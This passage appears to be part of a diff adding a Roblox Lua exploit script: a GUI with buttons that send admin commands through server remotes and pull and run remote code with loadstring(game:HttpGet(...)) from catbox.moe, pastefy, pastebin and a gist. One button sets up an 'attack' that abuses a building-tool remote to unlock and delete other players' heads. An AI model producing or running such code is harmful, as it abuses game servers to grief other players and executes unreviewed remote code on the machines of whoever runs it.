+rq:InvokeServer(";size me 10")
+loadstring(game:HttpGet("https://files.catbox.moe/8fmn5s.txt"))()
+rq:InvokeServer(";speed me 30")
+loadstring(game:HttpGet("https://files.catbox.moe/dyphvq.txt"))()
+wait(1)
+rq:InvokeServer(";hat me 65523893")
+end)
+ 
+local Minos = Instance.new("TextButton")
+Minos.Size = UDim2.new(0.9, 19, 0.0, 25)
+Minos.Position = UDim2.new(0.0, 0, 0.0, 88)
+Minos.BackgroundColor3 = Color3.new(1, 1, 1)
+Minos.BorderColor3 = Color3.new(0, 0, 0)
+Minos.BorderSizePixel = 0
+Minos.Text = "McDonalds"
+Minos.BackgroundTransparency = 0.3
+Minos.TextColor3 = Color3.new(0, 0, 0) 
+Minos.Font = Enum.Font.Montserrat
+Minos.Parent = Scr
+Minos.TextSize = 19
+Minos.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastefy.app/s5dHfkXX/raw"))()
+end)
+ 
+local Jojo1 = Instance.new("TextButton")
+Jojo1.Size = UDim2.new(0.9, 19, 0.0, 25)
+Jojo1.Position = UDim2.new(0.0, 0, 0.0, 118)
+Jojo1.BackgroundColor3 = Color3.new(1, 1, 1)
+Jojo1.BorderColor3 = Color3.new(0, 0, 0)
+Jojo1.BorderSizePixel = 0
+Jojo1.Text = "Burger King"
+Jojo1.BackgroundTransparency = 0.3
+Jojo1.TextColor3 = Color3.new(0, 0, 0)
+Jojo1.Font = Enum.Font.Montserrat
+Jojo1.Parent = Scr
+Jojo1.TextSize = 19
+Jojo1.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastefy.app/a0nYgEIl/raw"))()
+end)
+ 
+local Cashx = Instance.new("TextButton")
+Cashx.Size = UDim2.new(0.9, 19, 0.0, 25)
+Cashx.Position = UDim2.new(0.0, 0, 0.0, 148)
+Cashx.BackgroundColor3 = Color3.new(1, 1, 1)
+Cashx.BorderColor3 = Color3.new(0, 0, 0)
+Cashx.BorderSizePixel = 0
+Cashx.Text = "Thomas"
+Cashx.BackgroundTransparency = 0.3
+Cashx.TextColor3 = Color3.new(0, 0, 0)
+Cashx.Font = Enum.Font.Montserrat
+Cashx.Parent = Scr
+Cashx.TextSize = 19
+Cashx.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastebin.com/raw/jDpU45cz"))()
+end)
+
+local Gojo = Instance.new("TextButton")
+Gojo.Size = UDim2.new(0.9, 19, 0.0, 25)
+Gojo.Position = UDim2.new(0.0, 0, 0.0, 178)
+Gojo.BackgroundColor3 = Color3.new(1, 1, 1)
+Gojo.BorderColor3 = Color3.new(0, 0, 0)
+Gojo.BorderSizePixel = 0
+Gojo.Text = "John doe"
+Gojo.BackgroundTransparency = 0.3
+Gojo.TextColor3 = Color3.new(0, 0, 0)
+Gojo.Font = Enum.Font.Montserrat
+Gojo.Parent = Scr
+Gojo.TextSize = 19
+Gojo.MouseButton1Click:Connect(function()
+local player = game.Players.LocalPlayer
+    local char = player.Character
+    local tool
+    for i,v in player:GetDescendants() do
+        if v.Name == "SyncAPI" then
+            tool = v.Parent
+        end
+    end
+    for i,v in game.ReplicatedStorage:GetDescendants() do
+        if v.Name == "SyncAPI" then
+            tool = v.Parent
+        end
+    end
+   
+    remote = tool.SyncAPI.ServerEndpoint
+    function _(args)
+        remote:InvokeServer(unpack(args))
+    end
+
+
+local function Color(part, color)
+	local args = {
+		"SyncColor",
+		{
+			{
+				Part = part,
+				Color = color,
+				UnionColoring = false
+			}
+		}
+	}
+	_(args)
+end
+
+local function applyDecorationToPart(part) 
+    
+    local argsCreate = {
+        [1] = "CreateDecorations",
+        [2] = {
+            [1] = {
+                ["Part"] = part,
+                ["DecorationType"] = "Fire"
+            }
+        }
+    }
+
+   
+    local argsSync = {
+        [1] = "SyncDecorate",
+        [2] = {
+            [1] = {
+                ["Part"] = part,
+                ["DecorationType"] = "Fire",
+                ["Size"] = 3,
+                ["Heat"] = 25,
+                ["Color"] = Color3.fromRGB(255, 0, 0), 
+                ["SecondaryColor"] = Color3.fromRGB(255, 0, 0) 
+            } 
+        } 
+    }
+
+    
+    _(argsCreate)
+    _(argsSync)
+end
+
+local function Parter(part) 
+    
+    local argsCreate = {
+        [1] = "CreateDecorations",
+        [2] = {
+            [1] = {
+                ["Part"] = part,
+                ["DecorationType"] = "Smoke"
+            }
+        }
+    }
+
+   
+    local argsSync = {
+        [1] = "SyncDecorate",
+        [2] = {
+            [1] = {
+                ["Part"] = part,
+                ["DecorationType"] = "Smoke",
+                ["Size"] = 3,
+                ["Color"] = Color3.fromRGB(255, 0, 0),  
+            } 
+        } 
+    }
+
+    
+    _(argsCreate)
+    _(argsSync)
+end
+local function eyePart(part) 
+    
+    local argsCreate = {
+        [1] = "CreateDecorations",
+        [2] = {
+            [1] = {
+                ["Part"] = part,
+                ["DecorationType"] = "Fire"
+            }
+        }
+    }
+
+   
+    local argsSync = {
+        [1] = "SyncDecorate",
+        [2] = {
+            [1] = {
+                ["Part"] = part,
+                ["DecorationType"] = "Fire",
+                ["Size"] = 1,
+                ["Heat"] = 12,
+                ["Color"] = Color3.fromRGB(155, 0, 0), 
+                ["SecondaryColor"] = Color3.fromRGB(255, 0, 0) 
+            } 
+        } 
+    }
+
+    
+    _(argsCreate)
+    _(argsSync)
+end
+
+
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+local Players = game:GetService("Players")
+
+local UserInputService = game:GetService("UserInputService")
+
+local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandModification
+
+
+
+
+local player = Players.LocalPlayer
+
+local character = player.Character or player.CharacterAdded:Wait()
+
+    
+RequestCommand:InvokeServer(";removeaccessories")
+RequestCommand:InvokeServer(";titlebk me John Doe")
+
+wait(1)
+RequestCommand:InvokeServer(";hat me 107676946962151")
+wait(0.5)
+RequestCommand:InvokeServer(";hat me 18196403126")
+wait(0.5)
+RequestCommand:InvokeServer(";hat me 18801497637")
+wait(0.5)
+ RequestCommand:InvokeServer(";shirt me 100276101149100")
+ RequestCommand:InvokeServer(";pants me 109662040845019")
+RequestCommand:InvokeServer(";head me 0")
+RequestCommand:InvokeServer(";face me 144075659")
+
+
+wait(1)
+
+local eye = char:FindFirstChild("Accessory (JohnEye)").Handle
+local arm = char:FindFirstChild("Right Arm")
+local tor = char:FindFirstChild("Torso")
+local ar2 = char:FindFirstChild("Left Arm")
+
+local RLeg = char:FindFirstChild("Right Leg")
+local head = char:FindFirstChild("Head")
+local LLeg = char:FindFirstChild("Left Leg")
+applyDecorationToPart(arm)
+applyDecorationToPart(ar2)
+eyePart(eye)
+Parter(tor)
+
+Color(arm, Color3.fromRGB(252, 255, 150))
+Color(ar2, Color3.fromRGB(252, 255, 150))
+Color(head, Color3.fromRGB(252, 255, 150))
+Color(tor, Color3.fromRGB(255, 255, 0))
+Color(RLeg, Color3.fromRGB(0, 200, 255))
+Color(LLeg, Color3.fromRGB(0, 200, 255))
+
+
+
+local arm = character:FindFirstChild("Right Arm") 
+local humanoid = character:FindFirstChildOfClass("Humanoid")
+
+
+local isDead = false
+
+humanoid.Died:Connect(function()
+	isDead = true
+end)
+
+
+local animator = humanoid:FindFirstChildOfClass("Animator")
+
+local attackAnim = Instance.new("Animation")
+attackAnim.AnimationId = "rbxassetid://186934658"
+local attackTrack = animator:LoadAnimation(attackAnim)
+
+function KillTarget(target)
+    if target and target.Character then
+        local head = target.Character:FindFirstChild("Head")
+        if head then
+            local args = {
+                [1] = "SetLocked",
+                [2] = {
+                    [1] = head
+                },
+
+                [3] = false
+            }
+            remote:InvokeServer(unpack(args))
+            task.wait(0.1) 
+            local args2 = {
+                [1] = "Remove",
+                [2] = {
+                    [1] = head
+                }
+            }
+            remote:InvokeServer(unpack(args2))
+        end
+    end
+end
+
+
+local function attack()
+    attackTrack:Play() 
+    local hitPlayer = nil
+    local touchedConnection
+
+    local function onTouch(other)
+        local otherPlayer = Players:GetPlayerFromCharacter(other.Parent)
+        if otherPlayer and otherPlayer ~= player then
+            hitPlayer = otherPlayer
+        end
+    end
+
+    touchedConnection = arm.Touched:Connect(onTouch)
+    task.wait(0.5)
+    if touchedConnection then
+        touchedConnection:Disconnect()
+    end
+    if hitPlayer then
+               RequestCommand:InvokeServer(" ")
+  
+KillTarget(hitPlayer)
+        task.wait(1)
+        
+    end
+
+end
+
+
+local screenGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
+screenGui.Name = "AttackButtonGui"
+
+local attackButton = Instance.new("TextButton")
+attackButton.Name = "AttackButton"
+attackButton.Parent = screenGui
+attackButton.Size = UDim2.new(0, 160, 0, 50)
+attackButton.Position = UDim2.new(0.5, -80, 1, -90)
+attackButton.AnchorPoint = Vector2.new(0.5, 0)
+attackButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+attackButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+attackButton.Font = Enum.Font.GothamBold
+attackButton.Text = "attack"
+attackButton.TextSize = 22
+attackButton.AutoButtonColor = true
+attackButton.ZIndex = 999
+
+
+attackButton.MouseButton1Click:Connect(function()
+	if not isDead then
+		attack()
+	end
+end)
+
+
+
+loadstring(game:HttpGet("https://gist.githubusercontent.com/Kotyara19k-Doorsspawner/ac3768adf302d0b28e71fc89ab46dcd4/raw/6ad0f8cc313a5541f884768c7f75abd62aee377e/John%2520Doe%2520Trial"))()
+
+end)
+
+local sec = Instance.new("TextBox")
+sec.Size = UDim2.new(0.3, 7, 0.0, 25)
+sec.Position = UDim2.new(0.0, 332, 0.0, 45)
+sec.BackgroundColor3 = Color3.new(1, 1, 1)
+sec.BorderColor3 = Color3.new(0, 0, 0)
+sec.BorderSizePixel = 0
+sec.Text = ""
+sec.TextColor3 = Color3.new(0, 0, 0)
+sec.BackgroundTransparency = 0.3
+sec.Font = Enum.Font.Montserrat
+sec.TextSize = 15
+sec.Parent = Image
+sec.PlaceholderText = "search"
+sec.PlaceholderColor3 = Color3.fromRGB(0, 0, 0)
+sec.TextSize = 21
+ 
+local command = Instance.new("TextBox")
+command.Size = UDim2.new(0.3, 29, 0.1, 0)
+command.Position = UDim2.new(0.5, 64, 0.0, 266)
+command.BackgroundColor3 = Color3.new(1, 1, 1)
+command.BorderColor3 = Color3.new(0, 0, 0)
+command.BorderSizePixel = 0
+command.Text = ""
+command.TextColor3 = Color3.new(0, 0, 0)
+command.BackgroundTransparency = 0.3
+command.Font = Enum.Font.Code
+command.TextSize = 15
+command.Parent = Image
+command.PlaceholderText = "command bar"
+command.PlaceholderColor3 = Color3.fromRGB(0, 0, 0)
+command.TextSize = 21
+ 
+local lel = Instance.new("ImageLabel")
+lel.Size = UDim2.new(0.0, 108, 0.0, 108)
+lel.Position = UDim2.new(-0.127000004, 0, 0.407999992, 0)
+lel.BackgroundColor3 = Color3.new(0, 0, 0)
+lel.ImageColor3 = Color3.new(1, 1, 1)
+lel.Image = "rbxassetid://146470272"
+lel.ImageTransparency = 0
+lel.Parent = gui
+ 
+lel.BackgroundTransparency = 1 
+ 
+local Ring = Instance.new("ImageLabel")
+Ring.Size = UDim2.new(1.0, 0, 1.0, 0)
+Ring.Position = UDim2.new(0.0, 0, 0.0, 0)
+Ring.BackgroundColor3 = Color3.new(0, 0, 0)
+Ring.ImageColor3 = Color3.new(1, 1, 1)
+Ring.Image = "rbxassetid://7102118272"
+Ring.ImageTransparency = 0
+Ring.Parent = lel
+ 
+Ring.BackgroundTransparency = 1
+ 
+local Orbit = Instance.new("ImageLabel")
+Orbit.Size = UDim2.new(0.0, 21, 0.0, 21)
+Orbit.Position = UDim2.new(0.0, 0, 0.0, 10)
+Orbit.BackgroundColor3 = Color3.new(0, 0, 0)
+Orbit.ImageColor3 = Color3.new(1, 1, 1)
+Orbit.Image = "rbxassetid://15654878092"
+Orbit.ImageTransparency = 0
+Orbit.Parent = Ring
+ 
+Orbit.BackgroundTransparency = 1
+ 
+lel:TweenPosition(UDim2.new(0.458, 0, 0.408, 0), "Out", "Linear", 0.4, false)
+wait(3)
+lel:TweenPosition(UDim2.new(0.0, 9, 0.0, 190), "Out", "Sine", 0.7, false)
+ 
+while wait() do
+Ring.Rotation = Ring.Rotation + 1
+Orbit.Rotation = Orbit.Rotation - 1
+end
+end)
+
+--[ Hold thingy I forgot to add at first ]--
+
+loadstring(game:HttpGet("https://files.catbox.moe/g89ms0.txt"))()
